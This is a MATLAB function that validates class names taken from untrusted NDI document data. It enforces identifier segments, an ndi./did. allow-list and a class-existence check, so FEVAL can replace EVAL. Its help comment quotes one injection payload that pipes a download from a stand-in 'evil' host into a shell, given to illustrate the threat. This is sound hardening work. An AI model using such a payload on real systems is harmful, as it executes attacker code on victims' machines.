function classNameOut = validateClassName(className, errorId)
% VALIDATECLASSNAME - validate a class name read from untrusted document data
%
%   CLASSNAMEOUT = ndi.fun.validateClassName(CLASSNAME)
%   CLASSNAMEOUT = ndi.fun.validateClassName(CLASSNAME, ERRORID)
%
%   Validates that CLASSNAME is a safe, fully-qualified MATLAB class name so it
%   can be instantiated with FEVAL instead of EVAL. The NDI object-
%   reconstruction paths build objects from a document field (e.g.
%   <subclass>.ndi_<subclass>_class) whose value can arrive from an untrusted
%   source such as a dataset downloaded from NDI Cloud. Passing that value to
%   EVAL lets a crafted field like "system('curl evil|sh'), ndi.daq.reader"
%   execute arbitrary MATLAB/shell code the moment a session is opened. Routing
%   the value through this validator and FEVAL removes that code-execution path.
%
%   Requirements enforced (any violation throws ERRORID):
%     * CLASSNAME is a nonempty char row / string scalar
%     * every dot-separated segment is a valid MATLAB identifier (isvarname),
%       which alone rejects parentheses, quotes, commas, semicolons and
%       whitespace -- i.e. everything an injection payload needs
%     * the name is in the ndi. or did. namespace (allow-list)
%     * the class exists on the path (exist(...,'class')), giving a diagnosable
%       error rather than a bare "undefined function" from FEVAL
%
%   ERRORID defaults to 'ndi:fun:validateClassName:invalidClassName'.
%
%   Mirrors the input-validation house pattern established in
%   ndi.document.assignPropertyPath / ndi.fun.getfieldpath (commit a030c830e)
%   and the shell-injection hardening in commit 86379c7de.

    arguments
        className
        errorId (1,:) char = 'ndi:fun:validateClassName:invalidClassName'
    end

    if isstring(className) && isscalar(className)
        className = char(className);
    end

    if ~ischar(className) || isempty(className) || ~isrow(className)
        error(errorId, ...
            'Class name must be a nonempty character row or string scalar; got a %s.', ...
            class(className));
    end

    segments = strsplit(className, '.');
    for i = 1:numel(segments)
        if ~isvarname(segments{i})
            error(errorId, ...
                ['Class name ''%s'' is not a valid MATLAB class name ' ...
                 '(segment ''%s'' is not a valid identifier). It may have ' ...
                 'come from untrusted document content and was rejected.'], ...
                className, segments{i});
        end
    end

    prefix = [segments{1} '.'];
    if ~any(strcmp(prefix, {'ndi.', 'did.'}))
        error(errorId, ...
            ['Class name ''%s'' is not in the allow-listed ndi. or did. ' ...
             'namespace and was rejected as unsafe to instantiate.'], className);
    end

    if exist(className, 'class') ~= 8
        error(errorId, ...
            'Class ''%s'' does not exist on the MATLAB path.', className);
    end

    classNameOut = className;
end
